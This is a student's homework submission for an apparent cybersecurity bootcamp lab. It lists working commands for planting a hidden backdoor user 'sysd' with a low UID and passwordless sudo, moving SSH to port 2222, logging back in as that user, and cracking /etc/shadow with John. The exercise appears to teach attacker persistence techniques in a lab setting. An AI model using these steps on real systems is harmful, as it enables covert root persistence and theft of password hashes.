:Submission File: 
Jonathan Portela
Please edit this file by adding the solution commands on the line below the prompt.
Save and submit the completed file for your homework submission.
Step 1: Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home folder created:
useradd --no-create-home sysd
Give your secret user a password:
passwd sysd
Give your secret user a system UID < 1000:
usermod -u 420 sysd
Give your secret user the same GID:
groupmod -g 420 sysd
Give your secret user full sudo access without the need for a password:
visudo

#includedir /etc/sudoers.d
sysd ALL=(ALL) NOPASSWD:ALL
Test that sudo access works without your password:
sudo -l
Step 2: Smooth Sailing
Edit the sshd_config file:


# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.
​
#Port 22
Port 2222
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::
Step 3: Testing Your Configuration Update
Restart the SSH service:
sudo systemctl restart ssh
Exit the root account:
exit
SSH to the target machine using your sysd account and port 2222:
ssh sysd@192.168.1.105 -p 2222
Use sudo to switch to the root user:
sudo su
Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:
ssh sysd@192.168.1.105 -p 2222
Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
john /etc/shadow

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.


